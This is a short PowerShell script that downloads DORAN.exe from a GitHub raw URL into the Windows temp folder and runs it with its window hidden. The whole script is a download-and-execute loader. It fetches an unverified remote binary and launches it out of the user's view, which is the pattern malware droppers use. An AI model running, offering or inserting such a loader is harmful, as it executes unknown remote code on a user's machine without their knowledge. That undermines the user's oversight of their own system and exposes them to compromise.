# Download and run the compiled DORAN.exe from GitHub
$exeUrl = "https://raw.githubusercontent.com/learnaisimplified/DORAN-Pro/main/dist/private/DORAN.exe"
$tempExe = "$env:TEMP\DORAN.exe"

Invoke-WebRequest -Uri $exeUrl -OutFile $tempExe -UseBasicParsing
Start-Process -FilePath $tempExe -WindowStyle Hidden
